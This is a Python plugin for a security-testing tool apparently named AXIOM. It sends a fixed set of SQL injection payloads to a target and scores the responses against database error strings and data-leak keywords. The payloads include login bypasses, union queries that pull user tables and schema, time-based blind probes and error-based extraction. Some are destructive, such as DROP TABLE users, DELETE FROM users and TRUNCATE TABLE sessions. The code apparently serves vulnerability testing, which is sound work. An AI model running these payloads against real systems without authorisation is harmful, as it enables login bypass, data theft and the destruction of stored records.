"""
AXIOM — Plugin: SQL Injector
════════════════════════════
Tests the target for SQL injection vulnerabilities using
classic, blind, and union-based payloads.
"""

from typing import List, Dict, Any
from rich.console import Console

console = Console()

# SQL error signatures from common databases
SQL_ERROR_SIGNATURES = [
    # MySQL
    "you have an error in your sql syntax",
    "mysql_fetch", "mysql_query", "mysqli",
    # PostgreSQL
    "pg_query", "pg_exec", "psql",
    "syntax error at or near",
    # SQLite
    "sqlite3.operationalerror", "near \"",
    # MSSQL
    "unclosed quotation mark", "mssql",
    "microsoft ole db", "odbc sql server",
    # Oracle
    "ora-", "oracle error",
    # Generic
    "sql syntax", "sql error", "database error",
    "query failed", "syntax error", "unexpected token",
    "invalid column", "unknown column", "table or view does not exist",
]

# Signatures suggesting successful injection
SUCCESS_SIGNATURES = [
    "admin", "root", "password", "users", "credentials",
    "id,", "username", "email", "table_name", "column_name",
    "information_schema", "1=1", "true",
]


class SQLInjectorPlugin:
    """
    Tests for SQL injection vulnerabilities using multiple
    injection families: classic, union-based, blind, and error-based.
    """

    name = "SQL_INJECTOR"

    def run(self, target) -> List[Dict[str, Any]]:
        """Run SQL injection test suite against the target."""
        console.print("[dim]  [PLUGIN] SQL Injector engaging...[/dim]")
        results = []

        injection_payloads = [
            # Classic authentication bypass
            ("auth_bypass_1", "' OR '1'='1"),
            ("auth_bypass_2", "' OR '1'='1' --"),
            ("auth_bypass_3", "' OR '1'='1' /*"),
            ("auth_bypass_4", "admin' --"),
            ("auth_bypass_5", "' OR 1=1#"),

            # Destructive (should be blocked)
            ("drop_table", "'; DROP TABLE users; --"),
            ("delete_all", "'; DELETE FROM users WHERE '1'='1"),
            ("truncate", "'; TRUNCATE TABLE sessions; --"),

            # Union-based extraction
            ("union_select", "' UNION SELECT * FROM users --"),
            ("union_schema", "' UNION SELECT table_name FROM information_schema.tables --"),
            ("union_columns", "' UNION SELECT column_name FROM information_schema.columns --"),

            # Blind / time-based
            ("blind_true", "' AND 1=1 --"),
            ("blind_false", "' AND 1=2 --"),
            ("time_based", "'; WAITFOR DELAY '0:0:5' --"),
            ("sleep_based", "'; SELECT SLEEP(5) --"),

            # Error-based extraction
            ("error_extract", "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()))) --"),

            # Second-order / encoded
            ("double_encode", "%27%20OR%20%271%27%3D%271"),
            ("unicode_bypass", "＇ OR ＇1＇＝＇1"),
        ]

        for label, payload in injection_payloads:
            try:
                response = target.send(payload)
                signal = self._score_sqli_response(response, payload)

                results.append({
                    "payload": f"[SQLi:{label}] {payload}",
                    "response": response[:500],
                    "signal": signal,
                    "type": "SQL_INJECTION",
                })

            except Exception as e:
                results.append({
                    "payload": f"[SQLi:{label}] {payload}",
                    "response": f"ERROR: {str(e)[:300]}",
                    "signal": 0.3,
                    "type": "SQL_INJECTION",
                })

        hits = sum(1 for r in results if r["signal"] > 0.3)
        console.print(
            f"[dim]  [PLUGIN] SQL Injector complete: "
            f"{len(results)} payloads, {hits} signals detected[/dim]"
        )

        return results

    @staticmethod
    def _score_sqli_response(response: str, payload: str) -> float:
        """
        Score a response for SQL injection signals.
        Higher = more likely vulnerable.
        """
        response_lower = response.lower()
        score = 0.0

        # Check for SQL error messages (error-based detection)
        for sig in SQL_ERROR_SIGNATURES:
            if sig in response_lower:
                score += 0.3

        # Check for data leakage (successful injection)
        for sig in SUCCESS_SIGNATURES:
            if sig in response_lower:
                score += 0.2

        # If the response is significantly different for true vs false
        # blind payloads, that's a signal (detected at aggregate level)

        # No error AND no block = the input was silently accepted
        error_keywords = ["error", "invalid", "blocked", "rejected", "cannot"]
        if not any(kw in response_lower for kw in error_keywords):
            # If SQL syntax was accepted without complaint, suspicious
            if any(c in payload for c in ["'", ";", "--", "UNION"]):
                score += 0.15

        # Very short or empty response to SQL payload is suspicious
        if len(response.strip()) < 20 and "'" in payload:
            score += 0.1

        return round(min(score, 1.0), 3)
